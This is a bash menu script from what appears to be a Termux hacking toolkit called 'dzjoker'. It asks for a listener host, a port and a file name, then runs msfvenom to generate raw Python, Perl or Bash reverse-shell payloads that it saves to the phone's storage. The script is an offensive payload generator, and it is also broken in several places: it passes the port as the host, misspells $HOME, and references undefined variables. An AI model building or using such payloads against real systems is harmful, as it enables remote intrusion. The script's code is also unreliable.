clear
cd $HOME/dzjoker
#     color
G1='\e[101m'
G2='\e[102m'
G3='\e[103m'
G4='\e[104m'
G5='\e[105m'
G6='\e[106m'
G7='\e[107m'
o='\033[0m'
r='\e[91m'
g='\e[92m'
y='\e[93m'
b='\e[94m'
p='\e[95m'
c='\e[96m'
w='\e[97m'
#    banner
toilet -f big -F gay "Payload"
echo -e "$r[$w"1"$r]"$w"==>"
sleep 0.1
echo -e "       ""$G4$w Payload$o"$r"=""$G4$w Python $o"
sleep 0.1
echo -e "$r[$w"2"$r]"$w"==>"
sleep 0.1
echo -e "       ""$G4$w payliad$o"$r"=""$G4$w Perl   $o"
sleep 0.1
echo -e "$r[$w"3"$r]"$w"==>"
sleep 0.1
echo -e "       ""$G4$w Payload$o"$r"=""$G4$w Bash   $o"
sleep 0.1
echo -e $red"                ["$w"00"$red"]"$red "ExIT"
sleep 0.1
echo -e $red"                ["$w"99"$red"]"$cyan "BaCk"
echo -e "$r"
read -p "Enter Number~: " payload
#     python
python(){
clear
toilet -f big -F gay "Python"
echo -e "$y"
read -p "Enter LHOST: " lhost
read -p "Enter LPORT: " lport
read -p "Enter Name~: " name
cd $H9ME/metasploit-framework
./msfvenom -p cmd/unix/reverse_python LHOST=$lport LPORT=$lport -f raw > /sdcard/dzjoker/$names.py
clear
echo -e "$c     Go Now /sdcard/dzjoker ^_*"
sleep 3
cd /$HOME/dzjoker
./joker.sh
}
if [ "$payload" -eq "1" ]; then
   	python
fi
#     perl
perl(){
clear
toilet -f big -F gay "..Perl"
echo -e "$b"
read -p "Enter LHOST: " Plhost
read -p "Enter LPORT: " Plport
read -p "Enter Name~: " Pname
cd $H9ME/metasploit-framework
./msfvenom -p cmd/unix/reverse_perl LHOST=$Plport LPORT=$Plport -f raw > /sdcard/dzjoker/$Pnames.pl
clear
echo -e "$c     Go Now /sdcard/dzjoker ^_*"
sleep 3
cd /$HOME/dzjoker
./joker.sh
}
if [ "$payload" -eq "2" ]; then
        perl
fi
#     bash
bash(){
clear
toilet -f big -F gay "..Bash"
echo -e "g"
read -p "Enter LHOST: " Blhost
read -p "Enter LPORT: " Blport
read -p "Enter Name~: " Bname
cd $H9ME/metasploit-framework
./msfvenom -p cmd/unix/reverse_bash LHOST=$Blport LPORT=$Blport -f raw > /sdcard/dzjoker/$Bnames.sh
clear
echo -e "$c     Go Now /sdcard/dzjoker ^_*"
sleep 3
cd /$HOME/dzjoker
./joker.sh
}
if [ "$payload" -eq "3" ]; then
        bash
fi
if [ "$payload" -eq "99" ]; then
./joker.sh
fi
if [ "$payload" -eq "00" ]; then
clear
exit
fi
./.pys.sh